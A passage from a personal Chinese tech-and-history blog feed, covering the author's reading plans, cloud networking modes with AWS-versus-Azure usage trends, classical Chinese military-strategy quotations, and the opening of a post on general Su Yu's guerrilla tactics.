<li>reduce: Evernote</li>
</ul>
<h4 id="Information-Technology"><a href="#Information-Technology" class="headerlink" title="Information Technology"></a>Information Technology</h4><ul>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">网络数据包的捕获与分析（libpcap、BPF及gopacket）</a></li>
<li><a href="https://riboseyim.github.io/2017/06/12/Microservice/">基于Kafka构建事件溯源型微服务</a></li>
<li><a href="https://riboseyim.github.io/2017/05/23/RestfulAPI/">基于Go语言快速构建一个RESTful API服务</a></li>
<li><a href="https://riboseyim.github.io/2017/05/24/Log/">关于程序日志Logger(Go语言描述)</a></li>
<li><a href="https://riboseyim.github.io/2017/04/17/DTrace_FTrace/">动态追踪技术：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">How Linux Works（一）：How the Linux Kernel Boots</a></li>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">How Linux Works（二）：User Space &amp; RAM</a></li>
<li><a href="https://riboseyim.github.io/2017/04/26/LinuxCommands/">Linux常用命令一百条</a></li>
<li><a href="http://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939718&amp;idx=1&amp;sn=d19b16fa6658f766c7a47039ab772525&amp;chksm=bd578c948a2005822b9600c310383444edab4e1e1aec6747528d90c48acb7c111bd455283ee2#rd">读书笔记|《图解性能优化》</a></li>
<li><a href="http://www.jianshu.com/p/f7511ac5c753">（翻译）Linux.com:引入开源软件的六大运营挑战</a></li>
</ul>
<h4 id="Culture-amp-History"><a href="#Culture-amp-History" class="headerlink" title="Culture &amp; History"></a>Culture &amp; History</h4><ul>
<li><a href="https://riboseyim.github.io/2016/04/24/LinusTorvalds/">读书笔记|Linux之父：Just for Fun！</a></li>
<li><a href="https://riboseyim.github.io/2017/05/28/History-Caoyun/">读书笔记|黄仁宇《明代的漕运》</a></li>
<li><a href="https://riboseyim.github.io/2017/06/24/History-Qing/">读书笔记|张集馨《时晴斋主人自叙年谱》</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/History-TaipingHeavenly/">读书笔记|宋景迁《太平天国》</a></li>
<li><a href="https://riboseyim.github.io/2017/04/20/MrGuZhun/">读书笔记|顾准《顾准日记》</a></li>
<li><a href="https://riboseyim.github.io/2017/07/02/Manager/">读书笔记|彼得·德鲁克：管理是一种自由</a></li>
<li><a href="https://riboseyim.github.io/2017/04/28/Check2012/">不忘初心：我的2012年阅读书单</a></li>
<li><a href="https://riboseyim.github.io/2017/05/13/Lincoln-Spielberg/">艺术评论|斯皮尔伯格的林肯情怀</a></li>
<li><a href="https://riboseyim.github.io/2017/04/13/Artistic-Les-Miserables/">(翻译)艺术评论|经济学人：解读世纪小说《悲惨世界》</a></li>
<li><a href="https://riboseyim.github.io/2017/03/16/Children/">(翻译)Financial Times：中国将加强进口儿童文学作品管制</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/Medal/">外军研究|美军授勋及嘉奖制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">Cyber-Security|香港拟增设网络安全与科技罪案总警司</a></li>
</ul>
<h4 id="Travel"><a href="#Travel" class="headerlink" title="Travel"></a>Travel</h4><ul>
<li><a href="https://riboseyim.github.io/2017/07/02/BirdWatching/">观鸟|广州湿地公园</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/Garden/">园林|南京瞻园</a></li>
</ul>
<h4 id="Skills"><a href="#Skills" class="headerlink" title="Skills"></a>Skills</h4><ul>
<li>Cooking:BASIC</li>
</ul>
<h2 id="异地多活-Off-site-activities"><a href="#异地多活-Off-site-activities" class="headerlink" title="异地多活 Off-site activities"></a>异地多活 Off-site activities</h2><blockquote>
<p>天之将明，其黑尤烈；飓风过岗，伏草惟存。</p>
</blockquote>
<h4 id="一、Blog-riboseyim-github-io"><a href="#一、Blog-riboseyim-github-io" class="headerlink" title="一、Blog(riboseyim.github.io)"></a>一、Blog(riboseyim.github.io)</h4><p>CNZZ排名：<br>20160630    2218497<br>20170630    820615    UP 63.01%</p>
<h4 id="二、Twitter-RiboseYim"><a href="#二、Twitter-RiboseYim" class="headerlink" title="二、Twitter (@RiboseYim)"></a>二、Twitter (@RiboseYim)</h4><p>20170630 tweets:105 followers:10</p>
<h4 id="三、小密圈"><a href="#三、小密圈" class="headerlink" title="三、小密圈"></a>三、小密圈</h4><p>20170630 35+162+177 total: 374</p>
<h2 id="2017年学习计划"><a href="#2017年学习计划" class="headerlink" title="2017年学习计划"></a>2017年学习计划</h2><h4 id="Technology"><a href="#Technology" class="headerlink" title="Technology"></a>Technology</h4><ul>
<li><p>[ ] FlameGraph<br>目标定位：熟练使用<br>立项时间：2015年11月<br>当前进度：——-</p>
</li>
<li><p>[ ] 源码解读系列文集<br>目标定位：面向输出的学习能力<br>立项时间：2016年2月<br>当前进度：——-</p>
</li>
<li><p>[ ] <a href="https://riboseyim.github.io/2017/05/12/Protocol-TCP/">《TCP／IP详解》【英】</a><br>  目标定位：通读<br>  立项时间：2016年11月<br>  当前进度：略读</p>
</li>
<li><p>[x] <a href="https://riboseyim.github.io/2017/04/26/SRE/">《Google SRE》【英】</a><br>  目标定位：通读、选择一个专题实践<br>  立项时间：2016年5月<br>  当前进度：略读</p>
</li>
<li><p>[x] <a href="https://riboseyim.github.io/2017/05/23/RestfulAPI/">《Introducing Go》【英】</a><br>  目标定位：通读、熟练掌握<br>  立项时间：2016年11月<br>  当前进度：完成（201705）</p>
</li>
<li><p>[ ]《Learning Spark》【英】<br>  目标定位：通读、熟练掌握<br>  立项时间：2016年11月<br>  当前进度：————-</p>
</li>
<li><p>[x] <a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">《How LINUX works》【英】</a><br>  目标定位：通读、分享一篇<br>  立项时间：2016年11月<br>  当前进度：完成（201705）</p>
</li>
<li><p>[x] <a href="https://riboseyim.github.io/2017/10/24/Linux-Perf-Picture/">读书笔记|《图解性能优化》</a><br>  当前进度：通读</p>
</li>
</ul>
<h4 id="Books"><a href="#Books" class="headerlink" title="Books"></a>Books</h4><ul>
<li>[X] 《李自成》 （完成）</li>
<li>[X] 《白鹿原》 （完成）</li>
<li>[X] 《戴笠传》 （完成）</li>
<li>[X] 《蒋介石日记》 （完成）</li>
<li>[X] 《吾国吾民》 （完成）</li>
<li>[ ] 《林肯传（英文版）》 （50%）</li>
<li><p>[ ] 《通往奴役之路（英文版）》（0%）</p>
</li>
<li><p>[ ]《Team of Rivals，the Political Genius of Abraham Lincoln》<br>目标定位：通读<br>立项时间：2016年中<br>当前进度：——-</p>
</li>
<li><p>[ ]《The Water Kingdom: A Secret History of China》<br>目标定位：通读<br>立项时间：2016年12月<br>当前进度：——-</p>
</li>
<li><p>[ ]《罗马帝国衰亡史》<br>目标定位：通读<br>立项时间：2014年<br>当前进度：——-</p>
</li>
<li><p>[x] <a href="https://riboseyim.github.io/2017/01/30/History-TaipingHeavenly/">《太平天国》（史景迁）（英译中）</a><br>目标定位：通读<br>立项时间：2016年11月<br>当前进度：完成（201701）</p>
</li>
<li><p>[x] <a href="https://riboseyim.github.io/2017/05/28/History-Caoyun/">《明代漕运 1368-1644》</a><br>目标定位：通读<br>立项时间：2016年11月<br>当前进度：完成（201705）</p>
</li>
<li><p>[x] <a href="https://riboseyim.github.io/2017/06/25/History-Ming/">《十六世纪明代中国之财政与税收》</a><br>目标定位：通读<br>立项时间：2016年10月<br>当前进度：完成（201705）</p>
</li>
</ul>
<h4 id="创作计划"><a href="#创作计划" class="headerlink" title="创作计划"></a>创作计划</h4><ul>
<li><p>[x] <a href="https://riboseyim.github.io/2016/05/31/TeamWork-Git/">技术《源码解读系列：Git》</a><br>立项时间：2015年<br>当前进度：——-</p>
</li>
<li><p>[ ] <a href="">工具类《优雅绘图指南》（关于技术绘图）</a><br>立项时间：2015年<br>当前进度：——-</p>
</li>
<li><p>[x] <a href="https://riboseyim.github.io/2017/02/09/eBook/">电子书GitBook:《Linux Perf Master》</a><br>立项时间：2016年11月<br>当前进度：<br>201702 Edition 0.1<br>201707 Edition 0.2<br>201712 Edition 0.3</p>
</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://sirupsen.com/2015/">Simon Eskildsen |@sirupsen 2015</a></li>
</ul>
]]></content>
      <categories>
        <category>站长信息</category>
      </categories>
      <tags>
        <tag>我的自传</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算 | Overview of Cloud Computing</title>
    <url>/2017/07/23/CloudComputing/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Introducing Cloud Computing</li>
<li>云计算平台的选择:AWS or Azure?</li>
</ul>
<span id="more"></span>
<h2 id="Overview-of-Cloud-Computing"><a href="#Overview-of-Cloud-Computing" class="headerlink" title="Overview of Cloud Computing"></a>Overview of Cloud Computing</h2><h4 id="Introduction-to-Cloud-Computing"><a href="#Introduction-to-Cloud-Computing" class="headerlink" title="Introduction to Cloud Computing"></a>Introduction to Cloud Computing</h4><h4 id="云计算网络"><a href="#云计算网络" class="headerlink" title="云计算网络"></a>云计算网络</h4><ul>
<li><p>Local network（本地网络）<br>一个只允许在本服务器内通信的虚拟网络，不能跨服务器通信。<br>主要用于单节点上测试，只能做单节点的部署(all-in-one)，这是因为此网络模式下流量并不能通过真实的物理网卡流出，integration bridge并没有与真实的物理网卡做mapping，只能保证同一主机上的vm是连通的。  </p>
</li>
<li><p>Flat network<br>基于不使用VLAN 的物理网络实现的虚拟网络，每个物理网络最多只能实现一个虚拟网络。<br>ID数只有1个，通常不用于数据网络，因为其不具备租户隔离型。即所有的虚拟机都在一个广播域。比较传统的网络模式，需求较少。</p>
</li>
<li><p>VLAN network（虚拟局域网）<br>基于物理VLAN 网络实现的虚拟网络。共享同一个物理网络的多个 VLAN 网络是相互隔离的，甚至可以使用重叠的 IP 地址空间。<br>在规模不大的私有云中，往往是用 VLAN 模式，简单、可靠、能够满足规模要求；而在大型的私有云或者公有云中，往往使用VxLAN。</p>
</li>
<li><p>GRE network （通用路由封装网络）<br>一个使用GRE 封装网络包的虚拟网络。GRE 封装的数据包基于 IP 路由表来进行路由，因此 GRE network 不和具体的物理网络绑定。</p>
</li>
</ul>
<h4 id="云计算存储"><a href="#云计算存储" class="headerlink" title="云计算存储"></a>云计算存储</h4><h2 id="云计算平台的选择-AWS-or-Azure"><a href="#云计算平台的选择-AWS-or-Azure" class="headerlink" title="云计算平台的选择:AWS or Azure?"></a>云计算平台的选择:AWS or Azure?</h2><ul>
<li><p>原文链接：<strong><a href="https://stackoverflow.blog/2017/07/21/trends-cloud-computing-uses-aws-uses-azure/">Stack Overflow:Trends in Cloud Computing: Who Uses AWS, Who Uses Azure?(2017)</a></strong></p>
</li>
<li><p>分析师 <strong><a href="https://github.com/dgrtwo">David Robinson</a></strong>：Data Scientist at Stack Overflow, works in R and Python.</p>
</li>
<li><p>工具：<a href="https://insights.stackoverflow.com/trends">The Stack Overflow Trends tool</a>。数据来源（Stack Overflow问题标签，时间跨度从2008至今）: <a href="https://stackoverflow.com/questions/tagged/amazon-web-services">amazon-web-services</a>、<a href="https://stackoverflow.com/questions/tagged/azure">azure</a>。</p>
</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Stack_Overflow_Trends_1.png" alt=""></p>
<h4 id="Traffic-to-AWS-and-Azure-over-time"><a href="#Traffic-to-AWS-and-Azure-over-time" class="headerlink" title="Traffic to AWS and Azure over time"></a>Traffic to AWS and Azure over time</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/Stack_Overflow_Trends_2.png" alt="Traffic to AWS and Azure over time"></p>
<p>很明显，AWS和Azure两个平台在2012的流量水平相当，之后AWS增长得更快。</p>
<h4 id="Technologies"><a href="#Technologies" class="headerlink" title="Technologies"></a>Technologies</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/Stack_Overflow_Trends_3.png" alt="Developers who use Azure and AWS by technology stack"></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>开发者标签</th>
<th>AWS</th>
<th>Azure</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>C#</td>
<td>少</td>
<td>压倒性优势</td>
<td>Azure是微软产品，C#是Window技术栈中Web开发的默认选项</td>
</tr>
<tr>
<td>Node.js</td>
<td>多</td>
<td>多</td>
<td>Node.js开发者倾向于使用云托管</td>
</tr>
<tr>
<td>Python／Ruby Rails</td>
<td>多</td>
<td>少</td>
<td></td>
</tr>
<tr>
<td>C／C++</td>
<td>很少</td>
<td>很少</td>
<td>很少部署在云应用</td>
</tr>
<tr>
<td>HTML</td>
<td>很少</td>
<td>很少</td>
<td>不负责配置云平台的前端开发人员和设计人员</td>
</tr>
</tbody>
</table>
</div>
<h4 id="By-industry"><a href="#By-industry" class="headerlink" title="By industry"></a>By industry</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/Stack_Overflow_Trends_4.png" alt="Traffic to Azure and ASW by industry"><br>AWS的问题覆盖广泛，Azure在特定行业，特别是咨询和能源行业广泛使用的平台。进一步分析表明，这些行业是微软堆栈最受欢迎的行业。相比之下，AWS在技术行业（如软件和网络公司）尤其受欢迎，尤其是在媒体公司（包括出版和娱乐）。同样值得注意的是，“学术”部门、主要由学生和研究人员组成，这些用户访问的语言和技术与美国其他地区相比非常不同。这表明云平台在大学里并没有被广泛教授，或者在研究中广泛使用，至少与Python和R等技术相比。</p>
<h4 id="By-country"><a href="#By-country" class="headerlink" title="By country"></a>By country</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/Stack_Overflow_Trends_5.png" alt="Comparing AWS and Azure traffic by country"></p>
<p>大部分国家的访问记录来看，关于AWS的问题数量要多于Azure的问题。但是有一个地方例外——荷兰，关于Azure的问题数量是AWS的两倍，一种可能的解释是微软在荷兰建了一个大型数据中心，导致该地区有相对较多的Azure平台开发者。<a href="http://www.datacenterdynamics.com/content-tracks/design-build/microsofts-2bn-netherlands-data-center-revealed/96753.fullarticle">Microsoft has built a major data center in the Netherlands</a></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://stackoverflow.blog/2017/07/21/trends-cloud-computing-uses-aws-uses-azure/">Stack Overflow:Trends in Cloud Computing: Who Uses AWS, Who Uses Azure?(2017)</a></li>
<li><a href="https://mp.weixin.qq.com/s/uuRa-UtzEA7ZwBPcHXnAzg">阿里云MySQL及Redis灵异断连现象：安全组静默丢包解决方法 |纤夫张  数据和云  2月25日</a></li>
<li><a href="https://mp.weixin.qq.com/s/G-H_ECkOJh9HZzZn0B5-5A">一文读懂常见云计算网络 | 原创： 杨武  新钛云服  2月15日</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Economist</tag>
        <tag>架构师</tag>
      </tags>
  </entry>
  <entry>
    <title>中国传统兵法精要</title>
    <url>/2017/11/05/Commander-Art-Of-War-Chinese/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>将不可骄，骄则失礼，失礼则人离，人离则重判。<br>将不可吝，吝则赏不行，赏不行则士不致命，士不致命则军无功。</p>
<a id="more"></a>
<blockquote>
<p>version 0.1:2011 年读书摘要<br>version 0.2:201607再次修订</p>
</blockquote>
<h4 id="选兵：识人之术"><a href="#选兵：识人之术" class="headerlink" title="选兵：识人之术"></a>选兵：识人之术</h4><p>选兵必胆为主。胆包在腹，不可见，何以选为？<br>殊不知人之精神露于外，第一选人以精神为主，而当兼用相法。<br>若将威素立，则先收之以恩；若将威未行，则先振之以威。</p>
<p>第一，不可用城市油滑之人，但看面目光白，行动伶便者是也。<br>第二，不可用奸巧之人，神色不定，见官府藐然无忌者是也。<br>第一可用，乡野老实之人。<br>第二可用，乃惯战之人。<br>－－戚继光</p>
<p>危国无贤人，乱政无善人。<br>爱人深者求贤急，乐得贤者养人厚。<br>国将霸者士皆归，邦将亡者贤先避。<br>－－《素书》</p>
<h2 id="练兵：操兵之道"><a href="#练兵：操兵之道" class="headerlink" title="练兵：操兵之道"></a>练兵：操兵之道</h2><p>（戚继光）光曰：操兵之道，不独执旗走阵于场肆而后谓之操。<br>虽闲居、坐睡、嬉戏亦为操也。善操兵者，必使其气性活泼，或逸而冗之，<br>或劳而息之，俱无定格，或相其意态，察其动静，而撙节之。<br>有精器而无精兵以用之，是谓徒费；有精兵而无精器以助之，是谓徒强。<br>须士兵立得脚跟定，则拽柴可败荆，况精器乎！</p>
<p>无兵而求战，是为至危；不求战而治兵，其祸尤为不可收拾。<br>先求敌而练兵者，其兵强；先练兵而求敌者，其兵弱。<br>－－蒋百里</p>
<p>三军一人，胜。－－《司马法》</p>
<p>军中有大勇、敢死、乐伤者，聚为一卒，名为冒刃之士；<br>有锐气、壮勇、强暴者，聚为一卒，名为陷阵之士；<br>。。。。。。<br>有赘婿人虏，欲掩迹扬名者，聚为一卒，名曰励钝之士；<br>有贫穷愤怒、欲快其心者，聚为一卒，名曰必死之士；<br>有材技兼人，能负重致远者，聚为一卒，名曰待命之士。<br>此军之练士，不可不察也。<br>－－《六韬》</p>
<p>分塞令：<br>中军、左、右、前、后军，皆有分地，方之以行垣，而无通其交往。<br>采薪刍牧者皆成伍，不成伍者不得通行。<br>吏属无节，士无伍者，横门诛之。<br>－－《素书》</p>
<h4 id="赏罚：励士之道"><a href="#赏罚：励士之道" class="headerlink" title="赏罚：励士之道"></a>赏罚：励士之道</h4><p>足寒伤心，人怨伤国。－－《素书》</p>
<p>励士之道，民之生不可不厚也。爵列之等，死丧之亲，民之所营不可不显也。<br>必也因民所生之制，因民所营而显之，田禄之实，饮食之亲，乡里相劝，死丧相求，兵役相从，此民之所励也。 委积不多则士不行，赏禄不多则民不劝，武士不选则众不强，器用不便则力不壮，刑罚不中则众不畏。－－《尉缭子》</p>
<p>民无两畏也，畏我侮敌，畏敌侮我。见侮者败，立威者胜。－－《尉缭子》</p>
<p>凡民，以仁就，以义战，以智决，以勇斗，以信专，以利劝，以功胜。<br>让以和，人以洽，自予以不循，争贤以为人，说其心，效其力。－－《司马法》</p>
<p>赏不逾时，欲民速得为善之利也；罚不迁列，欲民速规为不善之害也。<br>大捷不赏，上下皆不伐善，上苟不伐善，则不骄矣，下苟不伐善，必亡等矣。<br>大败不诛，上下皆以不善在已，上苟不善在已，必悔其过，不苟以不善在已，必远其罪。－－《司马法》</p>
<p>用兵之要，在崇礼而重禄。<br>礼崇则智士至，禄重则义士轻死，故禄贤不爱财，赏功不逾时，则下力并而敌国削。<br>夫用人之道，尊以爵，赡以财，则士自来。接以礼，励以义，则士死之。<br>－－《黄石公三略》</p>
<p>恩赏者，不独金帛之惠，虽一言一动皆可为恩为惠。<br>威罚者，不独刑杖之威，虽一语一默亦可为威为罚。<br>－－戚继光</p>
<h4 id="将苑：选才之道"><a href="#将苑：选才之道" class="headerlink" title="将苑：选才之道"></a>将苑：选才之道</h4><p>一曰，间之以是非而观其志<br>二曰，穷之占辞辩而观其变<br>三曰，咨之以计谋而观其识<br>四曰，告之以祸难而观其勇<br>五曰，醉之以酒而观其性<br>六曰，临之以利而观其廉<br>七曰，期之以事而观其信<br>－－《将苑》</p>
<p>纯乎纯矣，兼以文义，雅有德量，可为大将；<br>优于技艺，励于鼓舞，短于文学，可为偏裨；<br>才有余而志不足，勇有余而志不足，可为小将；<br>为愚、为诈、为贪，收于幕府，有事任用。<br>－－戚继光</p>
<p>商店的学生、工匠的艺徒，要是夜间能读上一点钟的书（就是在实际的事务中过生活的人而能攫取知识），恐怕倒可以负起复兴民族的责任，而每天坐汽车、包车，在中大学上六时以上功课的，恐怕将来只能做学理上的教授罢了。<br>－－蒋百里 民国二十三年五月</p>
<h4 id="将德"><a href="#将德" class="headerlink" title="将德"></a>将德</h4><p>兵者凶器，将者危任，是以器刚则缺，任重则危。<br>故善将者，不恃强，不怙势，宠之而不喜，辱之而不惧，<br>见利不贪，见美不淫，以身殉国，壹意而已。<br>－－《将苑》</p>
<p>将不可骄，骄则失礼，失礼则人离，人离则重判。<br>将不可吝，吝则赏不行，赏不行则士不致命，士不致命则军无功。<br>－－《将苑》</p>
<p>将能清，能静，能平，能整，能受谏，能听讼，能纳人，能采言，<br>能知国俗，能图山川，能表险难，能制军权。<br>仁贤之智，圣明之虑，负薪之言，廊庙之语，兴衰之事，将所宜闻。<br>夫将拒谏则英雄散，策不从则谋士叛，善恶同则功臣倦，专己则下归咎，<br>自伐则下少功，信谗则众离心，贪财则奸不禁，内顾则士卒淫。<br>－－《黄石公三略》</p>
<p>用兵之害，犹豫最大，三军之灾，莫过于狐疑。<br>善将者，见利不适，遇时不疑。－－《六韬》</p>
<p>子曰：君子惠而不费，劳而不怨，欲而不贪，泰而不骄，威而不猛。</p>
<p>韩非子曰：目短于己见，故以镜观面；智短于自知，故以道正己。<br>镜无见疵之罪，道无明过之恶。目失镜，则无以正须眉；身失道，则无以知迷惑。</p>
<h2 id="资料卡"><a href="#资料卡" class="headerlink" title="资料卡"></a>资料卡</h2><p>黄仁宇：“在戚继光以前，军队中受重视的是个人的武艺，能把武器挥舞如飞的士兵是大众心目中的英雄好汉。各地的拳师、打手、盐枭以至和尚苗人都被招聘入伍。等到他们被有组织的倭寇屡屡击溃以后，当局者才觉悟到一次战斗的成败并非完全决定于个人武艺。”</p>
<blockquote>
<p>“贺龙无论部队到了什么地方，都要收留流浪街头的小乞丐，接受初等文化……十五六岁到部队当勤务兵……积功递升班、排、连长，女小乞丐长大成人后，嫁给中低级军官为妻。这些人都把贺龙当作再生父母，对贺龙忠心耿耿。贺龙的部队被打垮以后，这些人只要知道贺龙在什么地方，千里迢迢讨饭也要去寻找贺龙的队伍，所以说贺龙的部队打得垮，但永远打不散。”<br>——— 湘军宿将李觉</p>
</blockquote>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="军事史"><a href="#军事史" class="headerlink" title="军事史"></a>军事史</h4><ul>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-CN/" target="_blank" rel="noopener">中国军事史 | Military History of China</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">美国军事史 | Military History of United States</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/History-TaipingHeavenly/" target="_blank" rel="noopener">太平天国史</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">私人历史文献 | 弗吉尼亚笔记</a></li>
<li><a href="https://riboseyim.github.io/2017/10/22/History-Qing-ZhangJiXing/" target="_blank" rel="noopener">私人历史文献 | 时晴斋主人自叙年谱</a></li>
<li><a href="https://riboseyim.github.io/2017/05/28/History-Caoyun/" target="_blank" rel="noopener">黄仁宇:《明代的漕运》</a></li>
</ul>
<h4 id="体能训练"><a href="#体能训练" class="headerlink" title="体能训练"></a>体能训练</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/" target="_blank" rel="noopener">Physical Training | 美军体能训练观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand" target="_blank" rel="noopener">Physical Training | 军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.com/2016/04/26/PHT-Running//">Physical Training | 训练项目：跑步</a></li>
<li><a href="https://riboseyim.com/2019/05/19/PHT-Skipping/">Physical Training | 训练项目：跳绳</a></li>
<li><a href="http://www.jianshu.com/p/6a2fea20b57b" target="_blank" rel="noopener">Physical Training | 跑步路线推荐</a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-RunningApp/">Physical Training | 跑步应用评测</a></li>
</ul>
<h4 id="讲武堂"><a href="#讲武堂" class="headerlink" title="讲武堂"></a>讲武堂</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-Art-Of-War-Chinese/" target="_blank" rel="noopener">讲武堂|中国传统兵法摘要</a></li>
<li><a href="https://riboseyim.github.io/2020/02/04/Commander-Art-Of-War/" target="_blank" rel="noopener">讲武堂|中国传统兵法摘要</a></li>
<li><a href="https://riboseyim.github.io/2017/08/15/Commander-Sergeant/" target="_blank" rel="noopener">外军研究|美军士官制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/" target="_blank" rel="noopener">外军研究|军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand/" target="_blank" rel="noopener">外军研究|军队体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/Medal/" target="_blank" rel="noopener">外军研究|美军授勋和嘉奖制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Medal-HK/" target="_blank" rel="noopener">太公分猪肉—香港特区授勋和嘉奖制度批判</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://ctext.org/wiki.pl?if=gb&amp;res=3&amp;remap=gb" target="_blank" rel="noopener">《纪效新书》| 明·戚继光 | 四库全书本</a></li>
<li><a href="http://www.shuku.net:8082/novels/zhuanji/syzzhylu/syzzhylu.html" target="_blank" rel="noopener">《粟裕战争回忆录》 | 粟裕 </a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/image_824254815542_3.png" alt></p>
]]></content>
      <categories>
        <category>军事战略</category>
      </categories>
      <tags>
        <tag>Manager</tag>
        <tag>讲武堂</tag>
        <tag>Commander</tag>
        <tag>Intelligence</tag>
      </tags>
  </entry>
  <entry>
    <title>讲武堂：粟裕的军事谋略与指挥艺术</title>
    <url>/2020/02/08/Commander-Art-Of-War-SuYu/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>近年来我从战役理论的角度系统地研究了这位常胜将军的大量战例，感觉研究越深入收获越多。我想可能需要用很多篇幅才能将这些收获和思考分享出来。</p>
<ul>
<li>军事谋略：从常败将军到常胜将军</li>
<li>指挥艺术：从游击战术到战役指挥</li>
</ul>
<a id="more"></a>
<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>粟裕是在中国近现代史上少见的职业军人，有“常胜将军”的美誉。</p>
<p>一般认为粟裕”尤其善于组织大兵团作战“，特别是其负责指挥的淮海战役创造了世界战争史上的奇迹。实际上粟裕一生先后六次负伤，颅内、体内留有弹片、弹头。多次经历全军覆没的惨败、谭家桥一役红十军团被整建制全歼、只有粟裕带着200多逃出生天。长期身处强敌环伺的敌后作战环境却常常能以弱胜强、险中求胜，指挥风格既统筹精妙又大胆果断，将战争艺术发挥到极致。</p>
<blockquote>
<p>毛：“在我的战友中，有一个最会带兵打仗的人，这个人叫粟裕，淮海战役就是他指挥的，他也是我们湖南人。”<br>林：“粟裕尽打神仙仗。”<br>刘伯承：“粟裕同志智深勇沉，非常优秀，百战百胜，有古名将之风，是我军最优秀的将领，是中国的战略家”。<br>陈毅：“粟裕将军的战役指挥一贯保持其常胜记录，愈出愈奇，愈打愈妙。”<br>叶剑英：“百战名将，谁人不知华东粟裕？战功高而不自居，贡献大而不自大，不简单哪！”</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Su_Yu_at_MengLiangGu_Battle_1947.jpg" alt></p>
<p><strong>粟裕是从士兵中成长起来的统帅</strong>。粟裕参加南昌起义时是叶挺教导队普通学兵，之后参加历次反“会剿”和全部五次反“围剿”。长征时留在南方组织了艰苦卓绝的浙南三年游击战争。抗日战争期间，开辟苏北根据地，历任新四军第二支队副司令员、第一师师长兼第六师师长、华中军区副司令员。第二次国共内战期间，任华中野战军司令、华东野战军副司令、代司令员兼代政委等职。</p>
<p>粟裕指挥的经典战例有：黄桥战役、车桥战役、天目山战役、苏中战役、宿北战役、鲁南战役、豫东战役、莱芜战役、孟良崮战役、济南战役、淮海战役、渡江战役等</p>
<p>粟裕有一本重要遗著 ——《粟裕战争回忆录》。1988年由解放军出版社出版，2007年再版并改名为《粟裕回忆录》。全书近40万字，主要部分由粟裕在其生前完成，主要通过粟裕口述，由粟裕的妻子楚青进行记录整理。粟裕回忆了自己从出生到上海战役结束的生涯，回顾了粟裕经历和指挥的各大战役（其中关于淮海战役的部分，在1988年11月的第一版中并没有。2007年8月再版时，加入了粟裕生前几次谈话的内容，成为第二十章《粟裕谈淮海战役》）。</p>
<h2 id="一、游击战术"><a href="#一、游击战术" class="headerlink" title="一、游击战术"></a>一、游击战术</h2><p>粟裕通常被认为善于大兵团战役指挥，其长年游击战争的经历很少被提及。</p>
<ul>
<li>1、积极进攻是游击战术的灵魂</li>
<li>2、根据地是游击战术的基础</li>
<li>3、统一协调是游击战术的组织保障</li>
</ul>
<p>p183<br>我们把游击战术在浙南游击区的运用，归纳为六条原则：</p>
<ul>
<li>（1）以最小的牺牲换取最大的胜利；</li>
<li>（2）不在消灭敌人，而在消磨敌人；</li>
<li>（3）支配敌人，掌握主动；</li>
<li>（4）积极进攻，绝少防御；</li>
<li>（5）飘忽不定，出没无常；</li>
<li>（6）越是敌人后方，越容易成功。</li>
</ul>
<h3 id="1、积极进攻是游击战术的灵魂"><a href="#1、积极进攻是游击战术的灵魂" class="headerlink" title="1、积极进攻是游击战术的灵魂"></a>1、积极进攻是游击战术的灵魂</h3><blockquote>
<p>积极进攻是游击战术的一大特色。——粟裕</p>
</blockquote>
<p>敌人进攻我们，我们是被动地，就迅速转移，不同敌人决战；我们进攻敌人，是有计划的，只要情况不变，坚决打。运用最多的作战形式是袭击。</p>
